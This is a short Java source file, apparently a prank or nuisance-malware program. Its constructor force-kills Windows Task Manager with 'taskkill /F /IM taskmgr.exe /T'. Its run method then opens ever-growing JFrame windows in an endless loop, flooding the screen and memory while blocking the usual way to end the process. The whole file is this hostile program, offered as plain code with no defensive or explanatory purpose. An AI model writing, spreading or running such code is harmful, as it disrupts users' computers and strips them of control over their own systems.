
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFrame;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author dd6800
 */
public class Thread implements Runnable {
    int x = 1;
    int y = 1;
    
    public Thread() {
        Runtime p = Runtime.getRuntime();
        try {
            p.exec("taskkill /F /IM taskmgr.exe /T");
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);            
        }
    }
    
    public void run() {
        for(;;) {
            JFrame myJFrame = new JFrame();
            myJFrame.setBounds(0, 0, 16 * x, 9 * y);
            myJFrame.setVisible(true);
            x++;
            y++;
        }
    }
}
